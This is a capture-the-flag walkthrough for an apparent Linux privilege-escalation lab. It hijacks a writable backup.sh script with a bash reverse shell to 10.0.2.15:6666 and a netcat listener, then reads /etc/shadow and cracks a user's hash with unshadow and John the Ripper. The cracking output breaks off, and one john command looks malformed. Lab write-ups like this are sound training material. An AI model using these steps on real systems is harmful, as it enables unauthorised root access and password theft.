# What is the content of the flag5.txt file? 

--> This is bit tricky. 
As you'll follow the process and go to home directory of user karen. You'll see a file named as "backup.sh". 
Once you check the content , there is nothing of use. As it only makes the zip of some folder. 
However we can make use of it to generate reverse shell. 
OH! NO !  😥 
You have the write permission but not the execution permission. Let's modify the bash script file by following command:

chmod u+x backup.sh

😍 you're good to go now. 

open file with your favourite text editor and enter the following code to generate reverse shell. 

#!/bin/bash
bash -i >& /dev/tcp/10.0.2.15/6666 0>&1

NOTE 🙄 : Change this IP address with your Virtual Machine Ip address. 

Let's proceed, run this command to have reserse shell connection and It will auto give you root privileges:

nc -nlvp 6666

Bravo ! 😎 , you made it. Redirect to ubuntu user and read the content of the file flag5.txt:

# What is Matt's password?

Matt's? Where is it comming from because there is no file or clue ? 
Stop for a moment, did you check the /etc/passwd?
Yeah, exactly you need to check all the user that are available. You found user "Matt". that's good 
But question is how would you come to know the password of Matt user?
As you're root user now, head to directory /etc/shadow to read the hash of password of Matt.
Thinking what to do next? 🤔 You forgot John the Ripper ? , If no , then let's crack it 

Store the username and hash of password in different file. unshadow the file into another file and Run the john ripper tool. 
following will commands will guide you through the way : 

┌──(user㉿kali)-[~/Desktop]
└─$ ls
hash  names  password

┌──(user㉿kali)-[~/Desktop]
└─$ unshadow names hash > passwords

┌──(muneer㉿kali)-[~/Desktop]
└─$ john /usr/sbin/ passwords 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
